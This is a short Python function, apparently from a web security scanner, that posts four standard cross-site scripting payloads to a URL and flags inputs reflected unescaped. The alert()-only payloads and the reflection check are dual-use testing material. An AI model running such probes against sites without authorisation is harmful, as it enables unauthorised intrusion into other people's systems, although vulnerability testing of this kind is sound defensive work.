import requests

def test_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'><script>alert(1)</script>",
    ]

    results = []

    for payload in payloads:
        try:
            response = requests.post(url, data={"input": payload})
            if response.status_code == 200 and payload in response.text:
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})
        except Exception as e:
            return {"error": f"Error testing XSS: {str(e)}"}

    return {"results": results}
